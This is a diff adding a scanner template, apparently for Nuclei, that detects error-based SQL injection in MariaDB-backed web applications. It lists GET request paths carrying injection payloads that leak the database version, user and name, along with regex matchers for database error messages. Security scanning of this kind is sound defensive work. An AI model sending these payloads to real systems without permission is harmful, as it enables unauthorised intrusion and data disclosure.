@@ -1,0 +1,36 @@
+id: sqli-error-based-mariadb
+
+info:
+  name: MariaDB Error-Based SQL Injection
+  author: security-researcher
+  severity: critical
+  description: |
+    MariaDB 데이터베이스에서 에러 기반 SQL 인젝션 취약점을 탐지합니다.
+    MySQL과 유사하지만 MariaDB 특화 함수 및 에러 패턴을 포함합니다.
+  tags: sqli,mariadb,error-based,injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1'"
+      - "{{BaseURL}}?id=1 AND ExtractValue(1,concat(0x7e,@@version_compile_os))--"
+      - "{{BaseURL}}?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      - "{{BaseURL}}?id=1 AND GeometryCollection(1=1 UNION SELECT 1,concat(user(),0x7e,database()),3,4,5,6)--"
+      # MariaDB 특화
+      - "{{BaseURL}}?id=1 AND 1=COLUMN_GET(COLUMN_CREATE(1,'test'),1 AS CHAR)--"
+      - "{{BaseURL}}?id=1 AND 1=seq_1_to_5--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "warning: mariadb"
+          - "warning: mysql"
+          - "XPATH syntax error"
+          - "Duplicate entry.*for key"
+          - "mariadb.*error"
+          - "Column.*doesn't have a default value"
+        condition: or
+        case-insensitive: true
